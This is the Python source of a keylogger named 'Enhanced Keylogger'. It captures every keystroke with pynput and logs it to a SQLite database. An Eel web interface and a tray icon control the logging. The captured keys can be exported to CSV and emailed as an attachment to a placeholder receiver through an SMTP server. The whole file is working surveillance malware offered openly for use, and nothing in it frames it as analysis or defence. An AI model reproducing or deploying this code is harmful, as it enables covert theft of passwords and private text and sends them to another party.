# main.py (Enhanced Keylogger)
import eel
from pynput import keyboard
import sqlite3
from datetime import datetime
import threading
import time
import os
import csv
import hashlib
from pystray import Icon, Menu, MenuItem
from PIL import Image, ImageDraw
import smtplib
from email.message import EmailMessage

is_logging = False
start_time = None
password_hash = hashlib.sha256("admin".encode()).hexdigest()

def setup_database():
    conn = sqlite3.connect('keystrokes.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key_pressed TEXT,
            timestamp DATETIME
        )
    ''')
    conn.commit()
    conn.close()

setup_database()

def format_key(key):
    try:
        return key.char
    except AttributeError:
        key_map = {
            keyboard.Key.space: "[SPACE]",
            keyboard.Key.enter: "[ENTER]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.ctrl: "[CTRL]",
            keyboard.Key.esc: "[ESC]",
        }
        return key_map.get(key, f"[{key.name.upper()}]") if hasattr(key, 'name') else str(key)

def on_press(key):
    if is_logging:
        keystroke = format_key(key)
        conn = sqlite3.connect('keystrokes.db')
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO keystrokes (key_pressed, timestamp)
            VALUES (?, ?)
        ''', (keystroke, datetime.now()))
        conn.commit()
        conn.close()

def start_keylogger():
    global is_logging, start_time
    is_logging = True
    start_time = time.time()

def stop_keylogger():
    global is_logging
    is_logging = False

def create_icon():
    image = Image.new('RGB', (64, 64), color=(73, 109, 137))
    draw = ImageDraw.Draw(image)
    draw.rectangle([8, 8, 56, 56], fill=(255, 165, 0))
    return image

def run_tray():
    def on_exit():
        listener.stop()
        icon.stop()

    icon = Icon("Keylogger", create_icon(), menu=Menu(
        MenuItem('Quit', on_exit)
    ))
    icon.run()

@eel.expose
def toggle_keylogger(action):
    if action == "start":
        start_keylogger()
        return "Keylogging started."
    elif action == "stop":
        stop_keylogger()
        return "Keylogging stopped."

@eel.expose
def get_status():
    return "Running" if is_logging else "Stopped"

@eel.expose
def get_duration():
    if start_time:
        return int(time.time() - start_time)
    return 0

@eel.expose
def get_keystrokes():
    conn = sqlite3.connect('keystrokes.db')
    cursor = conn.cursor()
    cursor.execute("SELECT key_pressed, timestamp FROM keystrokes ORDER BY id DESC LIMIT 100")
    rows = cursor.fetchall()
    conn.close()
    return rows

@eel.expose
def clear_keystrokes():
    conn = sqlite3.connect('keystrokes.db')
    cursor = conn.cursor()
    cursor.execute("DELETE FROM keystrokes")
    conn.commit()
    conn.close()
    return "Logs cleared."

@eel.expose
def export_csv():
    filename = os.path.join(os.getcwd(), "keystrokes_export.csv")
    conn = sqlite3.connect('keystrokes.db')
    cursor = conn.cursor()
    cursor.execute("SELECT key_pressed, timestamp FROM keystrokes")
    rows = cursor.fetchall()
    conn.close()
    with open(filename, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["Key Pressed", "Timestamp"])
        writer.writerows(rows)
    return filename

@eel.expose
def send_email():
    msg = EmailMessage()
    msg['Subject'] = 'Keylogger Logs'
    msg['From'] = 'youremail@example.com'
    msg['To'] = 'receiver@example.com'
    with open("keystrokes_export.csv", "rb") as f:
        msg.add_attachment(f.read(), maintype='application', subtype='csv', filename="logs.csv")
    with smtplib.SMTP('smtp.example.com', 587) as smtp:
        smtp.starttls()
        smtp.login('youremail@example.com', 'yourpassword')
        smtp.send_message(msg)
    return "Email sent."

@eel.expose
def verify_password(pwd):
    return hashlib.sha256(pwd.encode()).hexdigest() == password_hash

@eel.expose
def get_key_stats():
    conn = sqlite3.connect('keystrokes.db')
    cursor = conn.cursor()
    cursor.execute("SELECT key_pressed, COUNT(*) FROM keystrokes GROUP BY key_pressed ORDER BY COUNT(*) DESC LIMIT 5")
    stats = cursor.fetchall()
    conn.close()
    return stats

listener = keyboard.Listener(on_press=on_press)
listener.start()

eel.init("web")
threading.Thread(target=run_tray, daemon=True).start()
eel.start("index.html", size=(800, 600))
